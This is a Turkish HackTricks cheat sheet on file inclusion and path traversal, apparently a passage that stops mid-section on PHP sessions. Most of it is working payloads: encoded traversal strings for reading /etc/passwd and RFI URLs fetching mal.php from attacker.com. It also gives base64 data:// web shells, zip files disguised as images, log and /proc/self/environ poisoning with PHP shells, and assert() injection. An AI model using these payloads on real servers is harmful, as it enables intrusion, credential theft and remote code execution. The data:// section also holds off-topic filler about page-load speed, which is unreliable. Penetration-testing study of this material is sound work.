# Dosya Dahil Etme/Yol Geçişi

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcılarıyla iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanına ve zorluklarına dalmış içeriklerle etkileşim kurun

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avcılarının başlatıldığı ve önemli platform güncellemelerinin olduğu duyurularla bilgilenin

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!

## Dosya Dahil Etme

**Uzaktan Dosya Dahil Etme (RFI):** Dosya uzaktan bir sunucudan yüklenir (En iyi: Kodu yazabilir ve sunucu onu yürütür). Php'de bu varsayılan olarak **devre dışıdır** (**allow\_url\_include**).\
**Yerel Dosya Dahil Etme (LFI):** Sunucu bir yerel dosyayı yükler.

Bu zafiyet, kullanıcının sunucu tarafından yüklenecek olan dosyayı bir şekilde kontrol edebildiği durumlarda ortaya çıkar.

Zafiyete açık olan **PHP fonksiyonları**: require, require\_once, include, include\_once

Bu zafiyeti sömürmek için ilginç bir araç: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Kör - İlginç - LFI2RCE dosyaları
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Çeşitli \*nix LFI listelerini birleştirerek ve daha fazla yol ekleyerek bu listeyi oluşturdum:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Ayrıca `/` karakterini `\` ile değiştirmeyi deneyin\
Ayrıca `../../../../../` yolunu eklemeyi deneyin

Vulnerabilite olup olmadığını kontrol etmek için /etc/password dosyasını bulmak için çeşitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) bulunabilir.

### **Windows**

Farklı wordlistelerin birleştirilmesi:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Ayrıca `/` karakterini `\` ile değiştirmeyi deneyin\
Ayrıca `C:/` karakterini kaldırıp `../../../../../` yolunu eklemeyi deneyin

Vulnerabilite olup olmadığını kontrol etmek için /boot.ini dosyasını bulmak için çeşitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) bulunabilir.

### **OS X**

Linux'un LFI listesini kontrol edin.

## Temel LFI ve bypass yöntemleri

Tüm örnekler Yerel Dosya İçeriği (LFI) için olsa da, Uzak Dosya İçeriği (RFI) için de uygulanabilir (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Yinelemeli Olmayan Şekilde Kesilmiş Geçiş Dizileri

Bu bölümde, yinelemeli olmayan şekilde kesilmiş geçiş dizileri kullanarak dosya dahil etme saldırıları hakkında bilgi bulacaksınız. Bu saldırılar, hedef web uygulamasının güvenlik açıklarını kullanarak hedef sisteme yetkisiz erişim elde etmek için kullanılır.

Dosya dahil etme saldırıları, hedef web uygulamasının, kullanıcı tarafından sağlanan dosya yolunu doğrulamadan veya sınırlamadan dahil etmesi nedeniyle ortaya çıkar. Bu, saldırganın, hedef sistemin dosya sistemine erişim sağlamasına ve hassas verilere erişmesine olanak tanır.

Yinelemeli olmayan şekilde kesilmiş geçiş dizileri, saldırganın hedef web uygulamasında dosya yolunu manipüle etmek için kullandığı bir tekniktir. Bu teknik, saldırganın hedef sistemin dosya sistemine erişim sağlamasına ve istediği dosyaları dahil etmesine olanak tanır.

Bu bölümde, yinelemeli olmayan şekilde kesilmiş geçiş dizileri kullanarak dosya dahil etme saldırılarını gerçekleştirmek için kullanılan bazı teknikler ve yöntemler açıklanmaktadır. Bu teknikler ve yöntemler, saldırganın hedef web uygulamasında güvenlik açıklarını tespit etmesine ve bu açıkları kullanarak hedef sisteme yetkisiz erişim elde etmesine yardımcı olur.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Sağlanan dizeye sonuna daha fazla karakter ekleyerek atlayın (atlatma: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu, **PHP 5.4'ten beri çözülmüştür**.

### **Kodlama**

Çift URL kodlaması (ve diğerleri gibi) gibi standart olmayan kodlamaları kullanabilirsiniz:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Var olan bir klasörden

Muhtemelen arka uç, klasör yolunu kontrol ediyor:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Sunucudaki Dosya Sistemi Dizinlerini Keşfetme

Bir sunucunun dosya sistemi, belirli teknikler kullanılarak sadece dosyaları değil, dizinleri de keşfetmek için rekürsif olarak taranabilir. Bu süreç, dizin derinliğini belirlemeyi ve belirli klasörlerin varlığını sorgulamayı içerir. Aşağıda bu işlemi gerçekleştirmek için detaylı bir yöntem bulunmaktadır:

1. **Dizin Derinliğini Belirleme:**
Mevcut dizinin derinliğini belirlemek için `/etc/passwd` dosyasını (sunucu Linux tabanlı ise geçerli) başarıyla alarak dizin derinliğini belirleyin. Örnek bir URL aşağıdaki gibi yapılandırılmış olabilir ve üç derinlik göstermektedir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Klasörleri Araştırma:**
URL'nin sonuna şüpheli klasörün adını (örneğin, `private`) ekleyin, ardından `/etc/passwd`'a geri dönün. Eklenen dizin seviyesi bir artış gerektirdiğinden derinliği bir birim artırın:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Sonuçları Yorumlayın:**
Sunucunun yanıtı, klasörün var olup olmadığını gösterir:
- **Hata / Çıktı Yok:** `private` klasörü muhtemelen belirtilen konumda mevcut değil.
- **`/etc/passwd` Dosyasının İçeriği:** `private` klasörünün varlığı doğrulandı.

4. **Rekürsif Keşif:**
Keşfedilen klasörler, aynı teknik veya geleneksel Yerel Dosya Dahil Etme (LFI) yöntemleri kullanılarak alt dizinler veya dosyalar için daha fazla sorgulanabilir.

Dosya sisteminde farklı konumlardaki dizinleri keşfetmek için yükü uygun şekilde ayarlayın. Örneğin, `/var/www/` dizininde `private` adlı bir dizin olup olmadığını kontrol etmek için (mevcut dizin 3 derinlikte ise):
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Yol Kısaltma Tekniği**

Yol kısaltma, web uygulamalarında dosya yollarını manipüle etmek için kullanılan bir yöntemdir. Sıklıkla, dosya yollarının sonuna ek karakterler ekleyen belirli güvenlik önlemlerini atlayarak kısıtlanmış dosyalara erişmek için kullanılır. Amaç, güvenlik önlemi tarafından değiştirildiğinde hala istenen dosyaya işaret eden bir dosya yolunu oluşturmaktır.

PHP'de, dosya sisteminin doğası gereği, bir dosya yolunun çeşitli temsilleri eşdeğer kabul edilebilir. Örneğin:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` ve `/etc/passwd/` tümü aynı yol olarak kabul edilir.
- Son 6 karakteri `passwd` olan bir dosya yoluna `/` eklemek (bunu `passwd/` yapmak), hedeflenen dosyayı değiştirmez.
- Benzer şekilde, bir dosya yoluna `.php` eklenirse (örneğin `shellcode.php`), sonuna `/.` eklemek erişilen dosyayı değiştirmez.

Sağlanan örnekler, hassas içeriği (kullanıcı hesap bilgileri) nedeniyle yaygın bir hedef olan `/etc/passwd`'ye erişmek için yol kısaltmayı nasıl kullanacağınızı göstermektedir:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda, gerekli olan geçiş sayısı yaklaşık olarak 2027 olabilir, ancak bu sayı sunucunun yapılandırmasına bağlı olarak değişebilir.

- **Nokta Segmentleri ve Ek Karakterler Kullanma**:
Geçiş dizileri (`../`), ek nokta segmentleri ve karakterlerle birleştirilerek dosya sisteminde gezinmek için kullanılabilir, bu sayede sunucu tarafından eklenen dizeler görmezden gelinir.

- **Gerekli Geçiş Sayısını Belirleme**:
Deneme yanılma yoluyla, kök dizine ve ardından `/etc/passwd` dizinine gezinmek için gereken `../` dizilerinin tam sayısını bulabilirsiniz. Bu sayede eklenen dizeler (örneğin `.php`) etkisiz hale getirilir, ancak istenen yol (`/etc/passwd`) korunur.

- **Sahte Bir Dizinle Başlama**:
Yolun başına mevcut olmayan bir dizinle (örneğin `a/`) başlamak yaygın bir uygulamadır. Bu teknik, önlem amaçlı olarak veya sunucunun yol ayrıştırma mantığı gereksinimlerini karşılamak için kullanılır.

Yol kırpma tekniklerini kullanırken, sunucunun yol ayrıştırma davranışını ve dosya sistemi yapısını anlamak önemlidir. Her senaryo farklı bir yaklaşım gerektirebilir ve genellikle en etkili yöntemi bulmak için test yapmak gereklidir.

**Bu güvenlik açığı PHP 5.3'te düzeltilmiştir.**

### **Filtre atlama hileleri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Uzaktan Dosya Dahil Etme

Php'de bu varsayılan olarak devre dışı bırakılmıştır çünkü **`allow_url_include`** **Kapalı** durumdadır. Çalışması için **Açık** olması gerekmektedir ve bu durumda sunucunuzdan bir PHP dosyasını dahil edebilir ve RCE elde edebilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Eğer herhangi bir nedenden dolayı **`allow_url_include`** **Açık** olsa da, PHP dış web sayfalarına erişimi **filtreliyorsa**, [bu yazıya](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) göre, örneğin base64 ile kodlanmış bir PHP kodunu çözmek ve RCE elde etmek için veri protokolünü kullanabilirsiniz:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Önceki kodda, saldırganın `.txt` ile biten bir dizeye ihtiyacı olduğu için, dize onunla bitiyor ve b64 decode işleminden sonra bu kısım sadece gereksiz bilgi döndürecektir ve gerçek PHP kodu dahil edilecek (ve dolayısıyla, yürütülecektir).
{% endhint %}

`php://` protokolünü kullanmayan başka bir örnek ise:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Kök öğesi

Python'da şu gibi bir kodda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Eğer kullanıcı **`file_name`** için bir **mutlak yol** geçirirse, **önceki yol sadece kaldırılır**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Bu, [belgelere](https://docs.python.org/3.10/library/os.path.html#os.path.join) göre beklenen davranıştır:

> Eğer bir bileşen mutlak bir yol ise, tüm önceki bileşenler atılır ve birleştirme mutlak yol bileşeninden devam eder.

## Java Dizinleri Listeleme

Java'da bir Yol Geçişi (Path Traversal) olduğunda ve bir **dosya yerine bir dizin isterseniz**, **dizin listesi döndürülür**. Bu diğer dillerde (bildiğim kadarıyla) gerçekleşmez.

## İlk 25 parametre

İşte yerel dosya dahil etme (LFI) zafiyetlerine karşı savunmasız olabilecek ilk 25 parametre listesi ([linkten](https://twitter.com/trbughunters/status/1279768631845494787) alınmıştır):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHP sargılayıcıları ve protokollerini kullanarak LFI / RFI

### php://filter

PHP filtreleri, verinin okunmadan veya yazılmadan önce temel **değiştirme işlemlerini** gerçekleştirmenizi sağlar. 5 kategoriye ayrılırlar:

* [Dize Filtreleri](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Veriden etiketleri kaldırır ("<" ve ">" karakterleri arasındaki her şey)
* Bu filtre, modern PHP sürümlerinden kaybolmuştur.
* [Dönüşüm Filtreleri](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*`: Farklı bir kodlamaya dönüştürür (`convert.iconv.<input_enc>.<output_enc>`). Desteklenen **tüm kodlamaların listesini** almak için konsolda şunu çalıştırın: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` dönüşüm filtresini kötüye kullanarak, **keyfi metin oluşturabilirsiniz**, bu da keyfi metin yazmak veya keyfi metin işleme işlevi yapmak için kullanışlı olabilir. Daha fazla bilgi için [**php filtreleri aracılığıyla LFI2RCE**](lfi2rce-via-php-filters.md)'ye bakın.
{% endhint %}

* [Sıkıştırma Filtreleri](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: İçeriği sıkıştırır (çok fazla bilgi çıkarmak için kullanışlıdır)
* `zlib.inflate`: Veriyi açar
* [Şifreleme Filtreleri](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*`: Kullanımdan kaldırıldı
* `mdecrypt.*`: Kullanımdan kaldırıldı
* Diğer Filtreler
* php'de `var_dump(stream_get_filters());` çalıştırarak birkaç **beklenmeyen filtre** bulabilirsiniz:
* `consumed`
* `dechunk`: HTTP parçalı kodlamayı tersine çevirir
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" kısmı harf büyüklüğüne duyarsızdır.
{% endhint %}

### php://fd

Bu sarmalayıcı, işlemin açık olan dosya tanımlayıcılarına erişim sağlar. Açık dosyaların içeriğini dışarı çıkarmak için potansiyel olarak kullanışlıdır:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
**php://stdin, php://stdout ve php://stderr** kullanarak **sırasıyla dosya tanımlayıcıları 0, 1 ve 2'ye** erişebilirsiniz (bu saldırıda nasıl kullanılabileceğinden emin değilim)

### zip:// ve rar://

İçinde bir PHPShell bulunan bir Zip veya Rar dosyası yükleyin ve erişin.\
Rar protokolünü istismar edebilmek için **özel olarak etkinleştirilmesi gerekmektedir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Bu, bir veri URI'sidir ve web sayfalarında içerik yerine kullanılabilir. Veri URI'si, içeriği doğrudan URL'de kodlayarak sayfaya dahil etmek için kullanılır. Bu, dosya içeriğini doğrudan HTML veya CSS dosyasına eklemek için kullanılabilir.

Örneğin, aşağıdaki HTML kodu, bir resmi veri URI'si olarak içeriğe dahil eder:

```html
<img src="data:image/png;base64,iVBORw0KG..."/>
```

Bu, resmin dosya yolunu belirtmek yerine, resmin kendisini içeriğe dahil eder. Bu, harici bir dosyaya bağımlılığı ortadan kaldırır ve sayfanın daha hızlı yüklenmesini sağlar.

Veri URI'si ayrıca metin içeriğini de dahil etmek için kullanılabilir. Örneğin, aşağıdaki CSS kodu, bir metin dosyasını veri URI'si olarak içeriğe dahil eder:

```html
<style>
@import url("data:text/css;charset=utf-8;base64,dGVzdCBjb25zdCBkYXRhIHNjaGVtZXMgYXJlIGNvbW1vbmx5IHRvIGJlZ2luIGluIHN0b3JlZCBhbmQgdHJhbnNmZXJyZWQgdGV4dC4=");
</style>
```

Bu, harici bir CSS dosyasına bağımlılığı ortadan kaldırır ve sayfanın daha hızlı yüklenmesini sağlar.

Veri URI'si kullanırken dikkatli olunmalıdır çünkü içeriği doğrudan URL'de kodladığı için, içeriğin boyutu büyük olduğunda sayfanın yüklenme süresini etkileyebilir. Ayrıca, bazı tarayıcılar veri URI'sini desteklemeyebilir veya sınırlı boyutlarda destekleyebilir.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Bu protokol, php yapılandırmaları **`allow_url_open`** ve **`allow_url_include`** tarafından kısıtlanmıştır.

### expect://

Expect etkinleştirilmelidir. Kodu şu şekilde çalıştırabilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parametrelerinde payload'ınızı belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Bir `.phar` dosyası, bir web uygulaması `include` gibi dosya yükleme işlevlerini kullandığında PHP kodunu yürütmek için kullanılabilir. Aşağıdaki PHP kodu örneği, bir `.phar` dosyasının nasıl oluşturulacağını göstermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasını derlemek için aşağıdaki komut çalıştırılmalıdır:
```bash
php --define phar.readonly=0 create_path.php
```
Çalıştırıldığında `test.phar` adında bir dosya oluşturulur ve bu dosya Local File Inclusion (LFI) zafiyetlerini sömürmek için kullanılabilir.

LFI'nin yalnızca PHP kodunu çalıştırmadan dosya okuma işlemi gerçekleştirdiği durumlarda, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` veya `filesize()` gibi işlevler aracılığıyla, deserialization zafiyetinin sömürülmesi denenebilir. Bu zafiyet, `phar` protokolü kullanılarak dosyaların okunmasıyla ilişkilidir.

`.phar` dosyalarının bağlamında deserialization zafiyetlerini sömürme konusunda daha detaylı bilgi için aşağıdaki belgeye başvurun:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Daha fazla protokol

Daha fazla olası [**protokolü buraya eklemek için**](https://www.php.net/manual/en/wrappers.php) kontrol edin:

* [php://memory ve php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Belleğe veya geçici bir dosyaya yazma (bu nasıl bir dosya dahil etme saldırısında kullanışlı olabilir emin değilim)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Yerel dosya sistemine erişim
* [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL'lerine erişim
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL'lerine erişim
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Sıkıştırma Akışları
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Deseni eşleştiren dosya yollarını bulma (yazdırılabilir bir şey döndürmediği için burada gerçekten kullanışlı değil)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Güvenli Kabuk 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ses akışları (keyfi dosyaları okumak için kullanışlı değil)

## PHP'nin 'assert' Fonksiyonu Aracılığıyla LFI

PHP'de Local File Inclusion (LFI) riskleri, dize içinde kodu çalıştırabilen 'assert' fonksiyonuyla ilgilenirken özellikle yüksektir. Bu, dizin geçişi karakterlerini (örneğin "..") içeren girişlerin kontrol edildiği ancak uygun şekilde temizlenmediği durumlarda özellikle sorunlu olabilir.

Örneğin, PHP kodu, dizin geçişini önlemek için aşağıdaki gibi tasarlanmış olabilir:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, geçişi durdurmayı amaçlasa da, yanlışlıkla kod enjeksiyonu için bir vektör oluşturur. Dosya içeriğini okumak için bunu sömürmek isteyen bir saldırgan şunları kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer şekilde, keyfi sistem komutlarını yürütmek için şunları kullanabilirsiniz:
```plaintext
' and die(system("id")) or '
```
Bu payload'ları **URL kodlamasıyla** kodlamak önemlidir.


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcılarıyla iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanını ve zorluklarını inceleyen içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Gerçek zamanlı haberler ve içgörüler aracılığıyla hızlı tempolu hacking dünyasında güncel kalın

**En Son Duyurular**\
Yeni ödül avcılarının başlatılması ve önemli platform güncellemeleri hakkında bilgi edinin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katılın ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!**

## PHP Kör Yol Geçişi

{% hint style="warning" %}
Bu teknik, bir **PHP işlevinin** bir **dosyaya erişeceği dosya yolunu kontrol ettiğiniz** durumlarda ilgilidir, ancak dosyanın içeriğini göremezsiniz (basit bir **`file()`** çağrısı gibi), ancak içerik gösterilmez.
{% endhint %}

Bu [**inanılmaz gönderide**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html), PHP filtresi aracılığıyla kör yol geçişinin bir hata orak aracılığıyla bir dosyanın içeriğini **dışa aktarmanın** nasıl istismar edilebileceği açıklanmaktadır.

Özet olarak, teknik, dosyayı açan **PHP işlevinin bir hata** oluşturmasına neden olacak kadar büyük bir dosyanın içeriğini oluşturmak için **"UCS-4LE" kodlamasını** kullanır.

Ardından, ilk karakteri sızdırmak için **`dechunk`** filtresi kullanılır ve son olarak **base64** veya **rot13** gibi diğer filtrelerle birlikte **convert.iconv.UCS-4.UCS-4LE** ve **convert.iconv.UTF16.UTF-16BE** filtreleri kullanılarak diğer karakterlerin başına yerleştirilir ve sızdırılır.

**Etkilenen olabilecek işlevler**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (sadece hedef salt okunur ile)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik ayrıntılar için bahsedilen gönderiyi kontrol edin!

## LFI2RCE

### Uzaktan Dosya Dahil Etme

Daha önce açıklandığı gibi, [**bu bağlantıyı takip edin**](./#remote-file-inclusion).

### Apache/Nginx günlük dosyası aracılığıyla

Eğer Apache veya Nginx sunucusu, dahil etme işlevi içinde **LFI'ye karşı savunmasız** ise, **`/var/log/apache2/access.log` veya `/var/log/nginx/access.log`**'a erişmeyi deneyebilirsiniz, **kullanıcı ajanı** veya bir **GET parametresi** içine **`<?php system($_GET['c']); ?>`** gibi bir php shell yerleştirin ve o dosyayı dahil edin.

{% hint style="warning" %}
Shell için **tek tırnaklar yerine çift tırnaklar** kullanırsanız, çift tırnaklar "_**quote;**_" dizesi için değiştirilecek, **PHP burada bir hata atacak** ve **başka bir şey yürütülmeyecek**.

Ayrıca, payload'ı **doğru şekilde yazdığınızdan** emin olun, aksi takdirde PHP, günlük dosyasını yüklemeye her çalıştığında hata verecek ve ikinci bir fırsatınız olmayacak.
{% endhint %}

Bu aynı şekilde diğer günlüklerde de yapılabilir, ancak **dikkatli olun**, günlüklerdeki kod URL kodlanmış olabilir ve bu Shell'i bozabilir. **authorisation "basic"** başlığı, Base64'te "user:password" içerir ve günlüklerde çözülür. PHPShell bu başlığın içine yerleştirilebilir.\
Diğer olası günlük yolları:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing kelime listesi: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta Aracılığıyla

**Bir e-posta** gönderin ve içerisine `<?php echo system($_REQUEST["cmd"]); ?>` gibi PHP yükünüzü yerleştirin. Ardından, kullanıcının e-postasını **`/var/mail/<KULLANICI ADI>`** veya **`/var/spool/mail/<KULLANICI ADI>`** gibi bir yol ile dahil etmeyi deneyin.

### /proc/\*/fd/\* Aracılığıyla

1. Birçok shell yükleyin (örneğin: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) adresini dahil edin, burada $PID = işlemin PID'si (kaba kuvvetle bulunabilir) ve $FD dosya tanımlayıcısıdır (bu da kaba kuvvetle bulunabilir).

### /proc/self/environ Aracılığıyla

Bir günlük dosyası gibi davranarak, yükü User-Agent içinde gönderin. Bu, /proc/self/environ dosyasında yansıtılacaktır.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Yükleme Yoluyla

Bir dosya yükleyebiliyorsanız, sadece kabuk yükünü içine enjekte edin (örneğin: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Dosyayı okunabilir tutmak için en iyi yöntem, resimlerin/dokümanların/metin belgelerinin meta verilerine enjekte etmektir.

### Zip dosyası yükleyerek

PHP kabuğunu içeren bir ZIP dosyası yükleyin ve erişim sağlayın:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP oturumları aracılığıyla

Websitesinin PHP Oturumu (PHPSESSID) kullanıp kullanmadığını kontrol edin.
```
